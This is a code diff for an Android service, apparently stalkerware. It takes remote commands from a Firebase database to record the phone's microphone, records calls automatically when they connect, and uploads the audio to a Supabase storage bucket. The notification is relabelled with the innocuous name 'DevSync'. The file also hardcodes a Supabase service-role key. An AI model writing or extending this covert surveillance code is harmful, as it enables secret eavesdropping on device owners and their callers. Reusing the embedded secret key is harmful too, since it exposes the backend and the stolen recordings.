@@ -21,7 +21,7 @@ class RecordingService : Service() {
         const val DB_URL       = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
         const val SUPABASE_URL = "https://xzslribjzliewpyattcl.supabase.co"
         const val SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh6c2xyaWJqemxpZXdweWF0dGNsIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODc4OTY1NywiZXhwIjoyMDk0MzY1NjU3fQ.bZ2kCJesIeeTbZ5L1GrNzYAaDK5v3Ba8-R-SGWIU-A8"
-        const val BUCKET       = "recordings"
+        const val BUCKET = "recordings"
     }
 
     private val deviceId by lazy {
@@ -33,232 +33,29 @@ class RecordingService : Service() {
     private val regRef by lazy {
         FirebaseDatabase.getInstance(DB_URL).getReference("registered_devices/$deviceId")
     }
+    private val httpClient = OkHttpClient.Builder()
+        .callTimeout(90, java.util.concurrent.TimeUnit.SECONDS)
+        .build()
 
     private var mediaRecorder: MediaRecorder? = null
-    private var currentFile: File?            = null
-    private var recordingJob: Job?            = null
-    private var isRecording = false
-
-    private var phoneStateListener: PhoneStateListener? = null
+    private var currentFile: File?   = null
+    private var recordingJob: Job?   = null
+    private var isRecording          = false
     private var callRecordingEnabled = false
-    private var inCall = false
+    private var inCall               = false
 
-    private val httpClient = OkHttpClient.Builder()
-        .callTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
-        .build()
+    @Suppress("DEPRECATION")
+    private var phoneStateListener: PhoneStateListener? = null
+
+    // ── Lifecycle ─────────────────────────────────────────────────────────────
 
     override fun onCreate() {
         super.onCreate()
-        startForeground()
+        createNotificationChannel()
+        startForeground(1002, buildNotification("Ready — waiting for commands"))
+        reportStatus("🎙️ Recording service ready")
         setupFirebaseListeners()
         setupCallRecording()
-    }
-
-    private fun startForeground() {
-        val channelId = "recording_channel"
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel(channelId, "Recording Service", NotificationManager.IMPORTANCE_LOW)
-            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
-        }
-        val notif = NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Recording Service")
-            .setContentText("Listening for remote commands")
-            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .build()
-        startForeground(1002, notif)
-    }
-
-    private fun setupFirebaseListeners() {
-        // Remote start mic recording
-        database.child("start_recording").addValueEventListener(object : ValueEventListener {
-            override fun onDataChange(snapshot: DataSnapshot) {
-                if (snapshot.exists()) {
-                    val durationSec = snapshot.getValue(Long::class.java) ?: 30L
-                    database.child("start_recording").removeValue()
-                    if (!isRecording) startMicRecording(durationSec)
-                }
-            }
-            override fun onCancelled(e: DatabaseError) {}
-        })
-
-        // Remote stop
-        database.child("stop_recording").addValueEventListener(object : ValueEventListener {
-            override fun onDataChange(snapshot: DataSnapshot) {
-                if (snapshot.exists() && snapshot.getValue(Boolean::class.java) == true) {
-                    database.child("stop_recording").removeValue()
-                    stopAndUpload("mic")
-                }
-            }
-            override fun onCancelled(e: DatabaseError) {}
-        })
-
-        // Call recording toggle
-        database.child("call_recording_enabled").addValueEventListener(object : ValueEventListener {
-            override fun onDataChange(snapshot: DataSnapshot) {
-                callRecordingEnabled = snapshot.getValue(Boolean::class.java) ?: false
-                regRef.child("callRecordingEnabled").setValue(callRecordingEnabled)
-            }
-            override fun onCancelled(e: DatabaseError) {}
-        })
-    }
-
-    // ── MIC RECORDING ──────────────────────────────────────────────────────────
-
-    private fun startMicRecording(durationSec: Long) {
-        try {
-            val file = File(cacheDir, "mic_${System.currentTimeMillis()}.m4a")
-            currentFile = file
-
-            @Suppress("DEPRECATION")
-            mediaRecorder = MediaRecorder().apply {
-                setAudioSource(MediaRecorder.AudioSource.MIC)
-                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                setAudioSamplingRate(44100)
-                setAudioEncodingBitRate(128000)
-                setOutputFile(file.absolutePath)
-                prepare()
-                start()
-            }
-
-            isRecording = true
-            reportStatus("🎙️ Recording started (${durationSec}s)...")
-
-            recordingJob = CoroutineScope(Dispatchers.IO).launch {
-                delay(durationSec * 1000)
-                withContext(Dispatchers.Main) { stopAndUpload("mic") }
-            }
-        } catch (e: Exception) {
-            reportStatus("❌ Recording error: ${e.message}")
-        }
-    }
-
-    // ── CALL RECORDING ─────────────────────────────────────────────────────────
-
-    private fun setupCallRecording() {
-        val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
-
-        phoneStateListener = object : PhoneStateListener() {
-            @Suppress("DEPRECATION")
-            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
-                when (state) {
-                    TelephonyManager.CALL_STATE_OFFHOOK -> {
-                        // Call connected
-                        if (callRecordingEnabled && !inCall) {
-                            inCall = true
-                            startCallRecording(phoneNumber ?: "unknown")
-                        }
-                    }
-                    TelephonyManager.CALL_STATE_IDLE -> {
-                        // Call ended
-                        if (inCall) {
-                            inCall = false
-                            stopAndUpload("call")
-                        }
-                    }
-                }
-            }
-        }
-
-        @Suppress("DEPRECATION")
-        tm.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
-    }
-
-    private fun startCallRecording(number: String) {
-        try {
-            val file = File(cacheDir, "call_${number}_${System.currentTimeMillis()}.m4a")
-            currentFile = file
-
-            @Suppress("DEPRECATION")
-            mediaRecorder = MediaRecorder().apply {
-                // Try VOICE_CALL first (works on some devices), fallback to MIC
-                try {
-                    setAudioSource(MediaRecorder.AudioSource.VOICE_CALL)
-                } catch (e: Exception) {
-                    setAudioSource(MediaRecorder.AudioSource.MIC)
-                }
-                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                setAudioSamplingRate(44100)
-                setAudioEncodingBitRate(128000)
-                setOutputFile(file.absolutePath)
-                prepare()
-                start()
-            }
-
-            isRecording = true
-            reportStatus("📞 Call recording: $number...")
-        } catch (e: Exception) {
-            reportStatus("❌ Call recording error: ${e.message}")
-        }
-    }
-
-    // ── STOP + UPLOAD ──────────────────────────────────────────────────────────
-
-    private fun stopAndUpload(type: String) {
-        recordingJob?.cancel()
-        try {
-            mediaRecorder?.stop()
-            mediaRecorder?.release()
-        } catch (_: Exception) {}
-        mediaRecorder = null
-        isRecording = false
-
-        val file = currentFile ?: return
-        if (!file.exists() || file.length() == 0L) {
-            reportStatus("❌ Recording file empty")
-            return
-        }
-
-        reportStatus("⏫ Uploading $type recording...")
-        CoroutineScope(Dispatchers.IO).launch {
-            uploadToSupabase(file, type)
-        }
-    }
-
-    private fun uploadToSupabase(file: File, type: String) {
-        try {
-            val bytes    = file.readBytes()
-            val fileName = "${type}_${deviceId.takeLast(6)}_${System.currentTimeMillis()}.m4a"
-
-            val body = bytes.toRequestBody("audio/mp4".toMediaType())
-            val req  = Request.Builder()
-                .url("$SUPABASE_URL/storage/v1/object/$BUCKET/$fileName")
-                .header("Authorization", "Bearer $SUPABASE_KEY")
-                .header("apikey", SUPABASE_KEY)
-                .header("Content-Type", "audio/mp4")
-                .header("x-upsert", "true")
-                .post(body)
-                .build()
-
-            httpClient.newCall(req).execute().use { response ->
-                if (response.isSuccessful) {
-                    val publicUrl = "$SUPABASE_URL/storage/v1/object/public/$BUCKET/$fileName"
-                    FirebaseDatabase.getInstance(DB_URL)
-                        .getReference("recordings").push()
-                        .setValue(mapOf(
-                            "deviceId"  to deviceId,
-                            "type"      to type,
-                            "url"       to publicUrl,
-                            "timestamp" to System.currentTimeMillis(),
-                            "fileName"  to fileName
-                        ))
-                    reportStatus("✅ ${type.replaceFirstChar{it.uppercase()}} recording uploaded")
-                } else {
-                    val err = response.body?.string()?.take(100) ?: "no body"
-                    reportStatus("❌ Upload failed ${response.code}: $err")
-                }
-            }
-            file.delete()
-        } catch (e: Exception) {
-            reportStatus("❌ Upload error: ${e.message?.take(80)}")
-        }
-    }
-
-    private fun reportStatus(status: String) {
-        regRef.child("lastStatus").setValue(status)
-        regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
@@ -267,9 +64,235 @@ class RecordingService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         recordingJob?.cancel()
-        try { mediaRecorder?.stop(); mediaRecorder?.release() } catch (_: Exception) {}
+        safeStopRecorder()
         @Suppress("DEPRECATION")
         (getSystemService(TELEPHONY_SERVICE) as TelephonyManager)
             .listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
+    }
+
+    // ── Foreground Notification ───────────────────────────────────────────────
+
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val ch = NotificationChannel(
+                "rec_channel", "Recording Service", NotificationManager.IMPORTANCE_LOW
+            )
+            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
+        }
+    }
+
+    private fun buildNotification(text: String): Notification =
+        NotificationCompat.Builder(this, "rec_channel")
+            .setContentTitle("DevSync")
+            .setContentText(text)
+            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .build()
+
+    private fun updateNotification(text: String) {
+        val nm = getSystemService(NotificationManager::class.java)
+        nm.notify(1002, buildNotification(text))
+    }
+
+    // ── Firebase Listeners ────────────────────────────────────────────────────
+
+    private fun setupFirebaseListeners() {
+        // Start recording command
+        database.child("start_recording").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(s: DataSnapshot) {
+                if (!s.exists()) return
+                val dur = s.getValue(Long::class.java) ?: 30L
+                database.child("start_recording").removeValue()
+                if (!isRecording) startMicRecording(dur)
+                else reportStatus("⚠️ Already recording")
+            }
+            override fun onCancelled(e: DatabaseError) {}
+        })
+
+        // Stop recording command
+        database.child("stop_recording").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(s: DataSnapshot) {
+                if (s.exists() && s.getValue(Boolean::class.java) == true) {
+                    database.child("stop_recording").removeValue()
+                    if (isRecording) stopAndUpload("mic")
+                    else reportStatus("ℹ️ Not recording")
+                }
+            }
+            override fun onCancelled(e: DatabaseError) {}
+        })
+
+        // Call recording toggle
+        database.child("call_recording_enabled").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(s: DataSnapshot) {
+                callRecordingEnabled = s.getValue(Boolean::class.java) ?: false
+                regRef.child("callRecordingEnabled").setValue(callRecordingEnabled)
+                reportStatus(if (callRecordingEnabled) "📞 Call recording ON" else "📞 Call recording OFF")
+            }
+            override fun onCancelled(e: DatabaseError) {}
+        })
+
+        // Stop all
+        database.child("stop_all").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(s: DataSnapshot) {
+                if (s.exists() && s.getValue(Boolean::class.java) == true && isRecording) {
+                    stopAndUpload("mic")
+                }
+            }
+            override fun onCancelled(e: DatabaseError) {}
+        })
+    }
+
+    // ── Microphone Recording ──────────────────────────────────────────────────
+
+    private fun startMicRecording(durationSec: Long) {
+        try {
+            val file = File(cacheDir, "mic_${deviceId.takeLast(4)}_${System.currentTimeMillis()}.m4a")
+            currentFile = file
+
+            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
+                MediaRecorder(this)
+            else
+                @Suppress("DEPRECATION") MediaRecorder()
+
+            mediaRecorder!!.apply {
+                setAudioSource(MediaRecorder.AudioSource.MIC)
+                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                setAudioSamplingRate(44100)
+                setAudioEncodingBitRate(128_000)
+                setOutputFile(file.absolutePath)
+                prepare()
+                start()
+            }
+
+            isRecording = true
+            reportStatus("🔴 Recording started (${durationSec}s)")
+            updateNotification("🔴 Recording... ${durationSec}s")
+
+            // Auto-stop after duration
+            recordingJob = CoroutineScope(Dispatchers.IO).launch {
+                // Status updates every 10s
+                var remaining = durationSec
+                while (remaining > 0 && isRecording) {
+                    delay(10_000L)
+                    remaining -= 10
+                    if (isRecording && remaining > 0)
+                        withContext(Dispatchers.Main) {
+                            reportStatus("🔴 Recording... ${remaining}s left")
+                        }
+                }
+                withContext(Dispatchers.Main) {
+                    if (isRecording) stopAndUpload("mic")
+                }
+            }
+        } catch (e: Exception) {
+            isRecording = false
+            reportStatus("❌ Mic error: ${e.message?.take(80)}")
+        }
+    }
+
+    // ── Call Recording ────────────────────────────────────────────────────────
+
+    @Suppress("DEPRECATION")
+    private fun setupCallRecording() {
+        val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
+        phoneStateListener = object : PhoneStateListener() {
+            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
+                when (state) {
+                    TelephonyManager.CALL_STATE_OFFHOOK -> {
+                        // Call answered / outgoing
+                        if (callRecordingEnabled && !isRecording) {
+                            inCall = true
+                            reportStatus("📞 Call detected — recording...")
+                            startMicRecording(180L) // 3 min max
+                        }
+                    }
+                    TelephonyManager.CALL_STATE_IDLE -> {
+                        // Call ended
+                        if (inCall) {
+                            inCall = false
+                            if (isRecording) stopAndUpload("call")
+                        }
+                    }
+                    TelephonyManager.CALL_STATE_RINGING -> {
+                        reportStatus("📞 Incoming call...")
+                    }
+                }
+            }
+        }
+        tm.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
+    }
+
+    // ── Stop & Upload ─────────────────────────────────────────────────────────
+
+    private fun stopAndUpload(type: String) {
+        recordingJob?.cancel()
+        val file = currentFile ?: run {
+            reportStatus("❌ No recording file"); return
+        }
+        safeStopRecorder()
+        isRecording = false
+        updateNotification("📤 Uploading $type recording...")
+        reportStatus("📤 Uploading ${type} recording (${file.length() / 1024}KB)...")
+
+        CoroutineScope(Dispatchers.IO).launch {
+            if (!file.exists() || file.length() < 1024L) {
+                withContext(Dispatchers.Main) {
+                    reportStatus("❌ Recording file empty or missing")
+                }
+                return@launch
+            }
+            try {
+                val fileName = "${type}_${deviceId.takeLast(6)}_${System.currentTimeMillis()}.m4a"
+                val body = file.readBytes().toRequestBody("audio/mp4".toMediaType())
+                val req = Request.Builder()
+                    .url("$SUPABASE_URL/storage/v1/object/$BUCKET/$fileName")
+                    .header("Authorization", "Bearer $SUPABASE_KEY")
+                    .header("apikey", SUPABASE_KEY)
+                    .header("Content-Type", "audio/mp4")
+                    .header("x-upsert", "true")
+                    .post(body).build()
+
+                httpClient.newCall(req).execute().use { resp ->
+                    if (resp.isSuccessful) {
+                        val url = "$SUPABASE_URL/storage/v1/object/public/$BUCKET/$fileName"
+                        FirebaseDatabase.getInstance(DB_URL)
+                            .getReference("recordings").push()
+                            .setValue(mapOf(
+                                "deviceId"  to deviceId,
+                                "type"      to type,
+                                "url"       to url,
+                                "timestamp" to System.currentTimeMillis(),
+                                "fileName"  to fileName
+                            ))
+                        withContext(Dispatchers.Main) {
+                            reportStatus("✅ ${type} recording uploaded (${file.length() / 1024}KB)")
+                            updateNotification("✅ Upload done")
+                        }
+                    } else {
+                        val err = resp.body?.string()?.take(100) ?: ""
+                        withContext(Dispatchers.Main) {
+                            reportStatus("❌ Upload ${resp.code}: $err")
+                        }
+                    }
+                }
+                file.delete()
+            } catch (e: Exception) {
+                withContext(Dispatchers.Main) {
+                    reportStatus("❌ Upload error: ${e.message?.take(80)}")
+                }
+            }
+        }
+    }
+
+    private fun safeStopRecorder() {
+        try { mediaRecorder?.stop() }   catch (_: Exception) {}
+        try { mediaRecorder?.release() } catch (_: Exception) {}
+        mediaRecorder = null
+    }
+
+    private fun reportStatus(status: String) {
+        regRef.child("lastStatus").setValue(status)
+        regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
     }
 }
